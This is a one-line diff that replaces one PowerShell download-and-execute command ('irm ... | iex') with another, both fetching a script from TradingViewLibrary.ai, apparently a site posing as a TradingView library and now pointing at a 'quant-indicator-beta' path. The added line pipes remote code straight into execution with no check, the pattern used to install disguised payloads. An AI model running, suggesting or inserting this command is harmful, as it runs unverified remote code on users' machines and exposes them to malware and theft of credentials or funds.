@@ -1,1 +1,1 @@
-irm TradingViewLibrary.ai/install | iex
+irm TradingViewLibrary.ai/quant-indicator-beta | iex
